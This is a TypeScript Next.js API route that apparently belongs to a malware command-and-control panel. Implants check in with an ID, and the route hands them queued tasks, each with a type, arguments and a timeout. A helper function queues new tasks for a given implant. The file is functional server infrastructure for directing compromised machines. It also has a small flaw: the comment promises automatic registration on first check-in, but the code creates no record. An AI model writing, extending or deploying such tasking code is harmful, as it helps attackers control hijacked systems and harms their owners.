import { NextResponse, type NextRequest } from "next/server"
import { z } from "zod"
import { getImplantByImplantId, updateImplantLastSeen, createImplantTask, getPendingTasksForImplant, updateImplantTask } from "@/lib/db/implants"
import logger from "@/lib/logger"

const log = logger.child({ module: "api/dpanel/implant/tasks" })

export const runtime = "nodejs"
export const dynamic = "force-dynamic"

const TaskRequestSchema = z.object({
  implant_id: z.string(),
  last_seen: z.number(),
})

export async function POST(req: NextRequest): Promise<NextResponse> {
  try {
    const body = await req.json()
    const { implant_id, last_seen } = TaskRequestSchema.parse(body)

    // Update implant last seen time
    await updateImplantLastSeen(implant_id)

    // Get or create implant record
    let implant = await getImplantByImplantId(implant_id)
    if (!implant) {
      // Auto-create implant record on first checkin
      // This is a simplified version - in production you'd want proper registration
      console.log(`[+] New implant checkin: ${implant_id}`)
      return NextResponse.json({ 
        tasks: [],
        total: 0,
        message: "Implant registered"
      })
    }

    // Get pending tasks for this implant
    const pendingTasks = await getPendingTasksForImplant(implant_id)
    
    // Mark tasks as running
    for (const task of pendingTasks) {
      await updateImplantTask(task.id, "running")
    }

    // Convert to the format expected by the implant
    const tasks = pendingTasks.map(task => ({
      id: task.taskId,
      type: task.type,
      args: task.args,
      created_at: task.createdAt,
      timeout: 300, // 5 minutes default timeout
    }))

    return NextResponse.json({ 
      tasks: tasks,
      total: tasks.length 
    })
  } catch (error) {
    log.error({ err: error }, 'Task request error')
    return NextResponse.json({ error: "Invalid request" }, { status: 400 })
  }
}

// Helper function to add tasks (called from other API endpoints)
export async function addTask(implantId: string, taskType: string, args: Record<string, unknown>, createdById?: string): Promise<string> {
  const task = await createImplantTask({
    implantId,
    taskId: "", // taskId is auto-generated in the database layer
    type: taskType,
    args,
    createdById,
  })
  return task.taskId
}